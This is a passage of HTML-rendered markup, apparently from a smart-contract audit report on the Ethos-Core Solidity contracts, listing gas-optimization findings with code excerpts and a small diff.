class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">availableCapital</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">int256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">226</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">227</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalAllocBPS</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">emergencyShutdown</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> -</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allocated</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit: 1st access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stratMaxAllocation</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allocBPS</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) / </span><span class=\"mtk12\">PERCENT_DIVISOR</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit: 2nd access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">232</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stratCurrentAllocation</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">stratAddr</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allocated</span><span class=\"mtk1\">;</span><span class=\"mtk3\">//@audit: 3rd access</span></span></span></code></pre>\n<h2 id=\"multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\" style=\"position:relative;\"><a href=\"#multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate\" aria-label=\"multiple address mappings can be combined into a single mapping of an address to a struct where appropriate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate</h2>\n<p>Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key’s keccak256 hash (Gkeccak256 - 30 gas) and that calculation’s associated stack operations.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L88-L94\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L88-L94</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"135\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">88</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">91</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalStakesSnapshot</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalCollateralSnapshot</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L104-L105\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L104-L105</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"136\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">L_Collateral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">L_LUSDDebt</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L119-L120\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L119-L120</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"137\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastCollateralError_Redistribution</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastLUSDDebtError_Redistribution</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h2 id=\"using-storage-instead-of-memory-for-structsarrays-saves-gas\" style=\"position:relative;\"><a href=\"#using-storage-instead-of-memory-for-structsarrays-saves-gas\" aria-label=\"using storage instead of memory for structsarrays saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Using storage instead of memory for structs/arrays saves gas</h2>\n<p>When fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional MLOAD rather than a cheap stack read. Instead of declearing the variable with the memory keyword, declaring the variable with the storage keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a memory variable, is if the full struct/array is being returned by the function, is being passed to a function that requires memory, or if the array/struct is being read from another memory array/struct</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L687\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L687</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"138\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StabilityPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">687</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">Snapshots</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">snapshots</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositSnapshots</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_depositor</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"139\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/Ethos-Core/contracts/StabilityPool.sol b/Ethos-Core/contracts/StabilityPool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index db163b7..5f2a340 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/Ethos-Core/contracts/StabilityPool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/Ethos-Core/contracts/StabilityPool.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -684,7 +684,7 @@ contract StabilityPool is LiquityBase, Ownable, CheckContract, IStabilityPool {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint initialDeposit = deposits[_depositor].initialValue;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (initialDeposit == 0) {return 0;}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        Snapshots memory snapshots = depositSnapshots[_depositor];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        Snapshots storage snapshots = depositSnapshots[_depositor];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint LQTYGain = _getLQTYGainFromSnapshots(initialDeposit, snapshots);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L722\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L722</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"140\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StabilityPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">722</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">Snapshots</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">snapshots</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositSnapshots</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_depositor</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<h2 id=\"avoid-contract-existence-checks-by-using-solidity-version-0810-or-later\" style=\"position:relative;\"><a href=\"#avoid-contract-existence-checks-by-using-solidity-version-0810-or-later\" aria-label=\"avoid contract existence checks by using solidity version 0810 or later permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Avoid contract existence checks by using solidity version 0.8.10 or later</h2>\n<p>Prior to 0.8.10 the compiler inserted extra code, including EXTCODESIZE (100 gas), to check for contract existence for external calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value.</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L178-L181\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L178-L181</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"141\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BorrowerOperations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralCCR(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collCCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralCCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralMCR(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collMCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralMCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: fetchPrice(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceFeed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fetchPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralCCR(_collateral);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">286</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collCCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralCCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralMCR(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">287</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collMCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralMCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">288</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: fetchPrice(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">289</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceFeed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fetchPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralCCR(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">381</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collCCR</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralCCR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getCollateralDecimals(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">382</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collDecimals</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collateralConfig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCollateralDecimals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: fetchPrice(_collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">383</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">priceFeed</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fetchPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getTroveColl(msg.sender, _collateral)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">388</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">coll</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">troveManagerCached</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTroveColl</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getTroveDebt(msg.sender, _collateral) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">389</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">troveManagerCached</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTroveDebt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: getBorrowingFee(_LUSDAmount)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">421</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LUSDFee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_troveManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBorrowingFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_LUSDAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: increaseTroveColl</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">468</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newColl</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">_isCollIncrease</span><span class=\"mtk1\">) ? </span><span class=\"mtk12\">_troveManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseTroveColl</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collChange</span><span class=\"mtk1\">): </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">469</span><span class=\"mtk1\">: </span><span class=\"mtk12\">_troveManager</span><span 